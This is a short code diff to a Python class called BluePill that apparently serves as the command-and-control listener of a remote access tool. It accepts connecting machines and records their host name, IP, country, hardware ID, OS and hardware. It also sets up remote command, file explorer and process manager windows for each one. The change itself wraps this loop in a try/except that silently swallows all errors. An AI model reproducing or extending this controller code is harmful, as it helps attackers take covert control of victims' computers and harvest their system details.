@@ -24,36 +24,39 @@ class BluePill:
         self.socket.bind((ip,port))
         self.socket.listen()
         while self.active:
-            server_socket = [self.socket]
-            ready, _, _ = select.select(server_socket, [], [], 1)
-            if ready:
-                conn, addr = self.socket.accept()
-                self.my_window.connection.append(conn)
-                self.my_window.address.append(addr)
-                self.my_window.stream.append(b"")
-                self.my_window.command.append(b"")
-                self.my_window.remote_window.append(False)
-                self.my_window.command_window.append(None)
-                self.my_window.file_explorer.append(None)
-                self.my_window.process_manager.append(None)
-                self.send(b'BluePillv1.0', conn)
-                tcp_data = self.recv(conn)
-                print(tcp_data)
-                data = json.loads(tcp_data)
-                print(data)
-                host = data['SYSINFO']['Host Name']
-                ip = data['LOCATION']['ip']
-                country = data['LOCATION']['country']
-                hwid = data['HWID']
-                os_name = data['SYSINFO']['OS Name']
-                os_version = data['SYSINFO']['OS Version']
-                cpu_name = data['CPU']
-                gpu_name = data['GPU']
-                print(data['DISPLAY'])
-                print(type(data['DISPLAY']))
-                self.my_window.display_info.append(data['DISPLAY'])
-                self.my_window.add_new_data(host, ip, str(addr[1]), hwid, country, os_name, os_version, cpu_name, gpu_name)
-                self.start(self.my_window.last_used_id, conn)
+            try:
+                server_socket = [self.socket]
+                ready, _, _ = select.select(server_socket, [], [], 1)
+                if ready:
+                    conn, addr = self.socket.accept()
+                    self.my_window.connection.append(conn)
+                    self.my_window.address.append(addr)
+                    self.my_window.stream.append(b"")
+                    self.my_window.command.append(b"")
+                    self.my_window.remote_window.append(False)
+                    self.my_window.command_window.append(None)
+                    self.my_window.file_explorer.append(None)
+                    self.my_window.process_manager.append(None)
+                    self.send(b'BluePillv1.0', conn)
+                    tcp_data = self.recv(conn)
+                    print(tcp_data)
+                    data = json.loads(tcp_data)
+                    print(data)
+                    host = data['SYSINFO']['Host Name']
+                    ip = data['LOCATION']['ip']
+                    country = data['LOCATION']['country']
+                    hwid = data['HWID']
+                    os_name = data['SYSINFO']['OS Name']
+                    os_version = data['SYSINFO']['OS Version']
+                    cpu_name = data['CPU']
+                    gpu_name = data['GPU']
+                    print(data['DISPLAY'])
+                    print(type(data['DISPLAY']))
+                    self.my_window.display_info.append(data['DISPLAY'])
+                    self.my_window.add_new_data(host, ip, str(addr[1]), hwid, country, os_name, os_version, cpu_name, gpu_name)
+                    self.start(self.my_window.last_used_id, conn)
+            except:
+                pass
 
     def delete_item(self, item_id):
         row_index = -1
